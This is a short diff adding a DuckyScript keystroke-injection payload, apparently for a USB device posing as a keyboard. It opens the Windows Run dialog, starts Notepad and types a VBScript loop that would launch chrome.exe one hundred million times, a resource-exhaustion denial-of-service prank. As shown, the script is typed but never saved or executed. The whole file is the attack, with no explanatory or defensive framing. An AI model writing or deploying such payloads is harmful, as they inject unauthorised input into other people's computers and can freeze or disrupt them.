@@ -1,0 +1,14 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 500
+STRING Set oShell = CreateObject("WScript.Shell")
+ENTER
+STRING For i = 1 to 100000000
+ENTER
+STRING oShell.Run "chrome.exe"
+ENTER
+STRING Next
+ENTER
